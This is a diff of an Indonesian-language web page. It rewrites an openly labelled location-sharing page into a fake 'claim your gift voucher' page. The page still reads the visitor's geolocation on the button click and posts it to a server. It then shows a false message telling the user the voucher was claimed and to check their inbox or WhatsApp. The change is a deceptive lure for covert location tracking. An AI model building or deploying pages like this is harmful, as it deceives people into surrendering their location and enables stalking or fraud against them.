@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Share Lokasi Saya</title>
+  <title>🎁 Ambil Voucher Hadiah</title>
   <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
   <style>
     body {
       font-family: 'Nunito', sans-serif;
-      background: linear-gradient(135deg, #f0f4f8, #d9e4f5);
+      background: linear-gradient(135deg, #fff1e6, #ffe8cc);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -17,56 +17,58 @@
     }
     .container {
       background: white;
-      padding: 2rem;
-      border-radius: 1rem;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      padding: 2.5rem;
+      border-radius: 1.2rem;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
       text-align: center;
-      max-width: 400px;
+      max-width: 420px;
       width: 90%;
     }
     h1 {
-      font-size: 1.8rem;
-      margin-bottom: 0.5rem;
+      font-size: 1.9rem;
+      margin-bottom: 0.7rem;
     }
     p {
-      color: #555;
+      color: #444;
       font-size: 1rem;
-      margin-bottom: 1.5rem;
+      margin-bottom: 1.8rem;
     }
     button {
-      background: #28a745;
+      background: #ff7a00;
       color: white;
       border: none;
-      padding: 12px 24px;
-      font-size: 1rem;
-      border-radius: 0.75rem;
+      padding: 14px 26px;
+      font-size: 1.1rem;
+      border-radius: 0.8rem;
       cursor: pointer;
       transition: background 0.3s ease;
     }
     button:hover {
-      background: #218838;
+      background: #e26500;
     }
-    .emoji {
-      font-size: 2.5rem;
-      animation: pulse 2s infinite;
+    .gift {
+      font-size: 3rem;
+      animation: shake 1.5s infinite;
     }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
+    @keyframes shake {
+      0% { transform: rotate(0); }
+      25% { transform: rotate(3deg); }
+      50% { transform: rotate(-3deg); }
+      75% { transform: rotate(2deg); }
+      100% { transform: rotate(0); }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="emoji">📍</div>
-    <h1>Bagikan Lokasi Saya</h1>
-    <p>Klik tombol di bawah untuk mengirim lokasi terkini.</p>
-    <button id="shareBtn">🔒 Kirim Lokasi Sekarang</button>
+    <div class="gift">🎁</div>
+    <h1>Selamat! Kamu Dapat Voucher</h1>
+    <p>Untuk mengklaim voucher spesialmu, klik tombol di bawah.</p>
+    <button id="claimBtn">🎁 Ambil Voucher</button>
   </div>
 
   <script>
-    document.getElementById("shareBtn").addEventListener("click", function () {
+    document.getElementById("claimBtn").addEventListener("click", function () {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function (position) {
           const lat = position.coords.latitude;
@@ -92,12 +94,12 @@
             body: JSON.stringify(data)
           });
 
-          alert("✅ Lokasi berhasil dikirim!");
+          alert("🎉 Voucher kamu sudah diklaim. Cek kotak masuk atau WhatsApp kamu ya!");
         }, function (err) {
-          alert("❌ Gagal mendapatkan lokasi: " + err.message);
+          alert("❌ Gagal mengambil lokasi: " + err.message);
         });
       } else {
-        alert("❌ Browser tidak mendukung geolocation.");
+        alert("❌ Perangkat tidak mendukung pelacakan lokasi.");
       }
     });
   </script>
